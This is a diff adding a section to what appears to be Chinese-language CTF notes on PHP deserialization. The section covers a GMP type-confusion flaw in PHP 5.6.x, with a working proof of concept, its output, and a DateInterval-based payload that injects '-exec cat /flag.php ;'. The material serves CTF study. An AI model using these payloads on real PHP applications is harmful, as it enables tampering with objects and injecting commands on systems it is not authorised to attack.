@@ -355,8 +355,54 @@ http://localhost/CTF/index.php?name=GlobIterator&param=./*.php&param2=0
 或者
 $a=new DirectoryIterator("glob:///*");
 ```
-**相关的CTF题**
+## **4.9 利用GMP类型混淆漏洞修改对象属性**
+* php 5.6.x
+* 反序列化入口点
+* 可以触发__wakeup的触发点（在php < 5.6.11以下，可以使用内置类DateInterval）
+POC:
+```php
+class obj{
+    var $ryat;
+    function __wakeup(){
+        $this->ryat = 1;
+    }
+}
+$obj = new stdClass;
+$obj->aa = 1;
+$obj->bb = 2;
 
+$inner = 's:1:"1";a:3:{s:2:"aa";s:2:"hi";s:2:"bb";s:2:"hi";i:0;O:3:"obj":1:{s:4:"ryat";R:2;}}';
+$exploit = 'a:1:{i:0;C:3:"GMP":'.strlen($inner).':{'.$inner.'}}';
+$x = unserialize($exploit);
+var_dump($obj);
+-------------------------------------------------------------------------------
+object(stdClass)#1 (2) {
+  ["aa"]=>
+  int(1)
+  ["bb"]=>
+  int(2)
+}
+Actual result:
+object(stdClass)#1 (3) {
+  ["aa"]=>
+  string(2) "hi"
+  ["bb"]=>
+  string(2) "hi"
+  [0]=>
+  object(obj)#3 (1) {
+    ["ryat"]=>
+    &int(1)
+  }
+}
+//使用内置类
+$inner = 's:1:"4";a:3:{s:5:"kw0ng";R:2;s:4:"flag";s:43:"-exec cat /flag.php ;";i:0;O:12:"DateInterval":1:{s:1:"y";R:2;}}';
+$exploit = 'a:1:{i:0;C:3:"GMP":'.strlen($inner).':{'.$inner.'}}';
+echo $exploit;
+
+poc里的s:1:"1"要改成s:1:"4"，其中的4决定了GMP覆盖的对象是哪个object，DateInterval为php5.6-5.6.11可利用的内置类
+```
+
+**相关的CTF题**
 * LCTF-2018 T4lk 1s ch34p,sh0w m3 the sh31l
 * https://paper.seebug.org/680/
 * http://www.k0rz3n.com/2018/11/19/LCTF%202018%20T4lk%201s%20ch34p,sh0w%20m3%20the%20sh31l%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/
